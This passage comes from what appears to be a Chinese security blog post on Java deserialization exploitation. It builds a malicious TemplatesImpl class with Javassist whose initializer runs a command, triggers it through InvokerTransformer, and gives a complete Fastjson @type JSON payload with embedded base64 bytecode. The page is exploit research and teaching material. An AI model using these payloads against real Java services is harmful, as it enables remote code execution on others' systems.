</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>DOM</span><span class=w> </span><span class=n>document</span><span class=p>,</span><span class=w> </span><span class=n>DTMAxisIterator</span><span class=w> </span><span class=n>iterator</span><span class=p>,</span><span class=w> </span><span class=n>SerializationHandler</span><span class=w> </span><span class=n>handler</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>需注意：</p><ul><li>该方法最好用于 Java 9 以下版本。因为从 Java 9 开始，Java引入了模块系统，未被显式导出的类无法被引用，恶意类必须继承的<code>AbstractTranslet</code>类及其依赖的一些类正在这个范畴。</li><li>如果必须使用 Java 9 以上版本，需要在编译时添加<code>--add-exports</code>参数以临时绕过模块封装限制。</li></ul><h4 id=212-javassist>2.1.2 javassist</h4><p><code>Javassist</code>（Java Programming Assistant）是一个用于处理和操作Java字节码的类库。它提供了一种相对简单的方式来编辑现有的类或创建新的类。示例：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=cm>/* 
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=cm>&lt;dependency&gt;
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=cm>    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=cm>    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=cm>    &lt;version&gt;3.29.2-GA&lt;/version&gt;
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=cm>&lt;/dependency&gt;
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=cm>*/</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w></span><span class=n>ClassPool</span><span class=w> </span><span class=n>classPool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w></span><span class=n>CtClass</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>classPool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=p>,</span><span class=w> </span><span class=n>classPool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w></span><span class=n>clazz</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>insertAfter</span><span class=p>(</span><span class=s>&#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w></span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytescode</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><h4 id=213-构造templatesimpl>2.1.3 构造TemplatesImpl</h4><p>获取恶意类的字节码后，通过反射创建TemplatesImpl实例：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>newInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>bytescode</span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Evil&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_tfactory&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerFactoryImpl</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=c1>// setFieldValue方法</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>fieldName</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>fieldName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>    </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>    </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><ul><li>为什么用反射而不直接通过构造方法获取实例？<ul><li><code>TemplatesImpl</code>类仅提供一个无参的<code>public</code>构造方法，其他接收参数的构造方法都由<code>protected</code>关键字修饰，无法直接调用。</li><li><code>_bytecodes</code>、<code>_tfactory</code>等字段都有<code>private</code>修饰，无法直接访问。</li></ul></li><li>为什么要给<code>_tfactory</code>字段传入一个<code>TransformerFactoryImpl</code>实例？<ul><li><code>defineTransletClasses()</code>方法中声明类加载器时，会调用<code>_tfactory</code>的<code>getExternalExtensionsMap()</code>方法，<code>_tfactory</code>为<code>null</code>会导致报错无法进行下一步。</li></ul></li></ul><h3 id=22-利用恶意类>2.2 利用恶意类</h3><p>最理想状态下，在构造<code>TemplatesImpl</code>实例后，直接调用<code>newTransformer()</code>方法就达成了目标。但是一般不会有这样的机会，所以需要找到一些办法来调用<code>newTransformer()</code>方法。</p><h4 id=221-invokertransformer>2.2.1 InvokerTransformer</h4><p><code>InvokerTransformer</code>是 Apache Commons Collections 库中的一个类，该类的<code>transform</code>方法中存在一组反射调用，在受控条件下几乎可以调用任意类的任意方法。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// org.apache.commons.collections.functors.InvokerTransformer</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>InvokerTransformer</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>methodName</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>paramTypes</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w>      </span><span class=k>this</span><span class=p>.</span><span class=na>iMethodName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>methodName</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w>      </span><span class=k>this</span><span class=p>.</span><span class=na>iParamTypes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>paramTypes</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>      </span><span class=k>this</span><span class=p>.</span><span class=na>iArgs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>args</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>   </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>   </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>input</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>         </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>      </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>         </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class="line hl"><span class=ln>13</span><span class=cl><span class=w>            </span><span class=n>Class</span><span class=w> </span><span class=n>cls</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>();</span><span class=w>
</span></span></span><span class="line hl"><span class=ln>14</span><span class=cl><span class=w>            </span><span class=n>Method</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cls</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>iMethodName</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>iParamTypes</span><span class=p>);</span><span class=w>
</span></span></span><span class="line hl"><span class=ln>15</span><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>input</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>iArgs</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>         </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=c1>// ...</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>      </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>   </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>如上，当构造<code>InvokerTransformer</code>实例时为<code>methodName</code>参数传入<code>"newTransformer"</code>字符串，调用<code>transform()</code>方法时传入<code>TemplatesImpl</code>实例，就达到了调用<code>newTransformer()</code>方法的目的。示例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>InvokerTransformer</span><span class=w> </span><span class=n>invokerTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;newTransformer&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>invokerTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>templates</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>受控条件下调用<code>InvokerTransformer#transform()</code>方法的场景则在多条 Apache Commons Collections 库的反序列化利用链中存在，可参考 <strong><a class=link href=/p/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96cc2%e9%93%be>Java反序列化CC2链</a></strong>。</p><h4 id=222-fastjson>2.2.2 Fastjson</h4><p><strong><a class=link href=https://github.com/alibaba/fastjson target=_blank rel=noopener><code>Fastjson</code></a></strong> 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean，后者通过提供<code>JSON.parse()</code>和<code>JSON.parseObject()</code>方法供用户使用。</p><p>Fastjson 反序列化时，存在但不限于以下特性：</p><ul><li>可以通过JSON串中的 <code>@type</code> 键指定要反序列化的对象类</li><li>会尝试调用 <code>setter</code> 方法为对象字段赋值。<code>setter</code> 方法指的是满足以下条件的方法：<ul><li>方法名以 set 开头，长度大于4，第4位是大写字母；方法参数个数等于1；非静态方法；方法返回值类型为 <code>void</code> 或类本身</li></ul></li><li>不存在字段对应的 <code>setter</code> 方法时，尝试直接访问字段赋值</li><li>既不存在字段对应的 <code>setter</code> 方法，也无法直接访问字段（非<code>public</code>字段）时，会尝试调用该字段对应的 <code>getter</code> 方法。<ul><li><code>getter</code> 方法要求类似 <code>setter</code> 方法</li><li>具体逻辑不同版本存在差异；参考源码: <a class=link href=https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#L71 target=_blank rel=noopener>Fastjson#FieldDeserializer.java</a></li></ul></li><li>非<code>public</code>字段可以通过设置 <code>Feature.SupportNonPublicField</code> 访问。</li><li>反序列化时，如果字段类型为 <code>byte[]</code>，将会对 JSON 串中的字段值进行 base64 解码；对应的，在序列化时也会进行 base64 编码。</li></ul><p><strong>getOutputProperties</strong></p><p>阅读源码可以发现，<code>TemplatesImpl</code>类存在一个 <code>private</code> 修饰的<code>_outputProperties</code>字段和一个<code>getOutputProperties()</code>方法。<code>getOutputProperties()</code>方法则调用了<code>newTransformer()</code>方法。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln>1</span><span class=cl><span class=c1>// com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>synchronized</span><span class=w> </span><span class=n>Properties</span><span class=w> </span><span class=nf>getOutputProperties</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class="line hl"><span class=ln>4</span><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>newTransformer</span><span class=p>().</span><span class=na>getOutputProperties</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>TransformerConfigurationException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>8</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>9</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>结合上述 Fastjson 特性可知，当用于反序列化的 JSON 字符串包含<code>_outputProperties</code>字段时，反序列化过程中<code>TemplatesImpl</code>类的<code>getOutputProperties()</code>方法会被调用，从而触发<code>newTransformer()</code>方法。Payload 构造如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>String</span><span class=w> </span><span class=n>bytesStr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>bytescode</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>String</span><span class=w> </span><span class=n>json</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;{\&#34;@type\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;, &#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;_bytecodes\&#34;:[\&#34;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>bytesStr</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;], &#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;_name\&#34;:\&#34;Evil\&#34;, &#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;_tfactory\&#34;:{}, &#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;_outputProperties\&#34;:{}}&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// 反序列化执行            </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>parseObject</span><span class=p>(</span><span class=n>json</span><span class=p>,</span><span class=w> </span><span class=n>Feature</span><span class=p>.</span><span class=na>SupportNonPublicField</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>JSON示例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;@type&#34;</span><span class=p>:</span> <span class=s2>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;_bytecodes&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;yv66vgAAADQAIQoABwAUCgAVABYIABcKABUAGAcAGQcAGgcAGwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAZAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwACAAJBwAcDAAdAB4BABJvcGVuIC1hIENhbGN1bGF0b3IMAB8AIAEAE2phdmEvbGFuZy9FeGNlcHRpb24BACdjb20vYjVqdWFuL2V4cGxvaXQvZGVzZXJpYWxpemF0aW9uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAABAABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAoAAQAMAA0AAQAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABMAAQAMAA4AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABYACAAPAAkAAQAKAAAAQwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAAA4AAwAAAA0ACQAPAA0AEAAQAAAABwACTAcAEQAAAQASAAAAAgAT&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;_name&#34;</span><span class=p>:</span> <span class=s2>&#34;Evil&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;_tfactory&#34;</span><span class=p>:</span> <span class=p>{},</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;_outputProperties&#34;</span><span class=p>:</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/serialization/>Serialization</a></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc3%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc3%E9%93%BE/cx.c95681bdcae441ff61c8196eaad7764e_hu_cbcab9c6efb3d857.jpeg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC3链" data-hash="md5-yVaBvcrkQf9hyBluqtd2Tg=="></div><div class=article-details><h2 class=article-title>Java反序列化CC3链</h2></div></a></article><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc2%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc2%E9%93%BE/su7u.4d5a0453066295eaed763a2cb83fa5b3_hu_7c2a875cd1b4cd19.jpg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC2链" data-hash="md5-TVoEUwZilertdjosuD+lsw=="></div><div class=article-details><h2 class=article-title>Java反序列化CC2链</h2></div></a></article><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc1%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc1%E9%93%BE/%E7%99%BD%E6%9C%88%E9%AD%81.9236f11540c77ae1ad3f361b87bdb706_hu_719a98baf0ac77eb.jpg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC1链" data-hash="md5-kjbxFUDHeuGtPzYbh723Bg=="></div><div class=article-details><h2 class=article-title>Java反序列化CC1链</h2></div></a></article><article><a href=/p/java-%E5%86%85%E5%AD%98%E9%A9%AC/><div class=article-details><h2 class=article-title>Java 内存马</h2></div></a></article><article><a href=/p/java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/><div class=article-details><h2 class=article-title>Java 序列化与反序列化</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2025 B5juan's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>